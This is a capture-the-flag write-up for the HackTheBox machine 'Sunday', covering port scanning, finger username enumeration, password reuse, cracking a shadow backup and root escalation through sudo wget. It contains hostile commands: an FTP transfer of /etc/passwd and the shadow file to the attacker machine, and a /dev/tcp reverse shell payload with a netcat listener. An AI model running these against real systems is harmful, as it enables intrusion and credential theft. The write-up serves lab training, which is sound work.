# Sunday [HTB](https://app.hackthebox.com/machines/136)
![sunday-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/sunday-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 sunday.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/ports-02.png)


Let's run a version detection scan againt's the found ports:

```bash
nmap -p 79,111,515,6787,22022 -sCV sunday.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/nmap-res-03.png)

![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/nmap-res-04.png)


We have the following:

+ Finger service on port 79.
+ RPCbind on port 111.
+ Line Printer Daemon service on port 515.
+ An Apache server on port 6787.
+ An SSH server on port 22022.


We have some known services on unconventional ports like ssh on port 22022 and http on port 6787. We also have a printer daemon, the finger service and rpcbind. 


Let's start with the rpcbind service on port 11 to see what information we can gather about the system. Then we can move on to test the other services.


### RPCbind Port 111

RPCbind provides information between Unix systems. This can be leveraged to fingerprint the target OS to obtain information about available services, like NFS, NIS, or any rpc-based service.


To enumerate it we can try the following commands:

```bash
rpcinfo sunday.htb
nmap -sSUC -p111 sunday.htb
```


Unfortunately, this didn't return any useful inforamtion. The `rpcinfo` probe failed with an "unspecified authintication error", and nmap didn't result in anything useful. 


This happens sometimes with rpc, sometimes we get interesting information, in other occasions we get nothing. 



Let's move on to test the Finger service.


### Finger Port 79

Finger is used to obtain information about computer users like, login name, login time, other personal attributes like full name, etc. For example we can run the `finger` command on our Kali attack machine and get a listing of logged on users.


We can abuse this service to enumerate valid usernames on the system. We can use a tool from [pentestmonkey](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum) called `finger-user-enum` to do this.


After downloading the script I run it againts a username wordlist as such:

```bash
perl finger-user-enum.pl -U /usr/share/seclists/SecLists-master/Usernames/Names/names.txt -t 10.129.90.31
```

![usernames-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/usernames-06.png)


The result output is a bit messy, and we got quite a lot of usernames, some are service accounts like `ike`, `bin`, while others look like normal user accounts. 


I highlighted the usernames that stood out the most to me, `sunny` and `sammy` which are the only two users who had `ssh` marked as thier TTY. 


It's worth to keep this mind as we move forward and try to get access to the system. 



### Solaris Port 6787


If we open `http://sunday.htb:6787/` we get the following:


![err-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/err-07.png)


The site is asking us to switch over to HTTPS, so I adjust the url to `https://sunday.htb:6787/`, accept the risk regarding the invalid certificate and open the site:

![solaris-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/solaris-08.png)


We get a [Solaris](https://en.wikipedia.org/wiki/Oracle_Solaris) login prompt. First we need to input a username, and then we get prompted for the password. 


At first I tried to brute force the password for the `sunny` username with Burp's intruder, but to no avail. Then I started guessing passwords, After a couple of tries I found that `sunday` works to get into the webUI:

![web-ui-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/web-ui-09.png)


Then I tried to reuse the password for the ssh and it worked:

![shell-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/shell-10.png)


## Privilege Escalation


After I land on the machine as `sunny` I list he's home directory:

![home-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/home-11.png)


The first thing that jumps to my mind is that `.bash_history` is not linked to `/dev/null`, so I run the `history` command:

![history-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/histroy-12.png)


This is the beginning of the history file, the rest of it kind of repeates itself. Let's go over what we see here. 


The history file starts with `sunny` trying to get a shell as root with `su -`, then reads `/etc/resolve.conf`. running `su -` wont help us as we need to supply a password, `/etc/resolve.conf` has a single nameserver entry mapped to localhost. Not super unique.


Then we see `sunny` listing running processes with `ps auxww` and greping for the string `overwrite`, if we do the same we see the following:

![ps-aux-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/ps-aux-13.png)


We can see root is running this `/lib/svc/method/overwrite` file, unfortunately only root has permissions to this file:

![perms-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/perms-14.png)


Not much we can do with this right now.


Later on in the history file we see `sunny` listing he's sudo permissions and then using them to run `/root/troll`. Here is our sudo permissions:

![sudo-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/sudo-15.png)


We can't examine the `/root/troll` file with the `file` or `ls -l` commands. If we run it we can see the following:

![troll-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/troll-16.png)


I tried passing different arguments to the file but it always results in the same output. Not sure exactly how to expoit this, could very well just be a troll. 


Next in the history file we see `sunny` listing the contents of the `/backup` directory and the `/backup/shadow.backup` file:

![backup-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/backup-17.png)


Both files are identical and they read as such:

![shadow-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/shadow-18.png)


After this the history file repeats itself. 


At this point I decided to have a look around the filesystem and that's where I saw the following:

![home-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/home-19.png)


We can see that root is the owner of `sammy`'s home directory, this makes him an interesting target. We also have `sammy`'s password hash thanks to the `/backup/shadow.backup` file, let's `unshadow` it. 


First step is to transfer both `/etc/passwd` and `/backup/shadow.backup` files over to our attack machine. To do this we can start a local python ftp server on our attack machine with write permissions using:

```bash
python -m pyftpdlib -w
```

Then copy both files to `sunny`'s home directory, connect to our attack machine and transfer the files:
 
```bash
cp /etc/passwd .
cp /backup/shadow.backup .
ftp 10.10.14.34 2121
ftp> put passwd
ftp> put shadow.backup
```

Now we have both files on our attack machine:

![files-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/files-20.png)


To crack the hashes we can run the following:

```bash
unshadow passwd shadow.backup > crack.db
john crack.db
```

After a couple of seconds we get `sammy`'s password:

![pass-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/pass-21.png)


Let's login to the ssh server as `sammy`:

![sammy-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/sammy-22.png)


### Sammy


After getting a shell as `sammy` I list sudo permissions:

![sudo-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/sudo-23.png)


We can run `wget` as root without any credentials. If we check [GTObins](https://gtfobins.github.io/gtfobins/wget/#sudo) we can see that we can abuse this to get root shell as such:

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.34/443 0>&1' >$TF
sudo wget --use-askpass=$TF 0
```

So I start the local netcat listener on my attack machine with:

```bash
rlwrap nc -lnvp 443
```

And execute the above commands:

![exec-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/exec-24.png)


We can see the shell stalls, this is a great sign. 


On my listener I receive the connection:

![root-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/root-25.png)


## Beyond root

If we examine the `/root/troll` we ran eralier we can see the following:

![troll-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/troll-26.png)


This was just a troll, this script simply runs `id` as root and exists. 


In root's home directory we can also see an `overwrite` file:

![overwrite-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Sunday/img/overwrite-27.png)


This is the process we saw running earlier, it's simply runs an endless loop that copies `/root/troll.original` into `/root/troll`. Both files are identical. 

To exploit this, we can host a reverse shell script on our attack machine, then download the script as root with `sammy`'s sudo permissions and write that into `/root/troll.original` with the -O switch of the wget command. This will modify the overwrite the contents of `/root/troll` with our reverse shell script. Then we can use `sunny`'s sudo privileges to run `/root/troll`  and get a shell as root. 


This can also work with any SUID binary on the system. Another options would be to overwrite the `/etc/shadow` file with a malicious veraint from our attack machinethat has a root user we control.


Simply put, one can leverage running wget as root to overwrite any file on the system. 

